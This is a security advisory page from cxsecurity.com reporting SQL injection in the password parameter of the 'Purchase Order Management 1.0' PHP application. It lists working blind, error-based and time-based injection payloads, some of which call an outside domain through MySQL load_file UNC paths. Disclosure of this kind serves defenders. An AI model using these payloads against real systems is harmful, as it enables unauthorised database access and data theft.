---
title: Purchase Order Management 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023030012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-07
fetch_date: 2025-10-04T08:47:46.707280
---

# Purchase Order Management 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Purchase Order Management 1.0 SQL Injection** **2023.03.06**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Purchase Order Management-1.0 - SQLi
## Author: nu11secur1ty
## Date: 03.06.2023
## Vendor: https://www.sourcecodester.com/user/257130/activity
## Software: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `password` parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load\_file('\\\\907tu6mdwzuv9ctlt93eg10er5xyls9jc74uvik.stupid.com\\aej'))+'
was submitted in the password parameter. This payload injects a SQL
sub-query that calls MySQL's load\_file function with a UNC file path
that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed.
STATUS: HIGH Vulnerability - CRITICAL
[+]Payload:
```mysql
---
Parameter: password (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: username=pwKLHXbY&password=-4290') OR 6172=6172 AND ('XovE'='XovE
Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
Payload: username=pwKLHXbY&password=j3X!k3l!R0'+(select
load\_file('\\\\907tu6mdwzuv9ctlt93eg10er5xyls9jc74uvikkc0rcehfjmie8te5szqd23hxgomfa5yu.stupid.com\\aej'))+'')
OR (SELECT 8766 FROM(SELECT COUNT(\*),CONCAT(0x717a6a6b71,(SELECT
(ELT(8766=8766,1))),0x7162767871,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND ('dncG'='dncG
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: username=pwKLHXbY&password=j3X!k3l!R0'+(select
load\_file('\\\\907tu6mdwzuv9ctlt93eg10er5xyls9jc74uvikkc0rcehfjmie8te5szqd23hxgomfa5yu.stupid.com\\aej'))+'')
AND (SELECT 7405 FROM (SELECT(SLEEP(3)))pVNf) AND ('fltf'='fltf
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Purchase-Order-Management-1.0/SQLi)
## Proof and Exploit:
[href](https://streamable.com/w173zp)
## Time spend:
00:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at
https://packetstormsecurity.com/https://cve.mitre.org/index.html and
https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top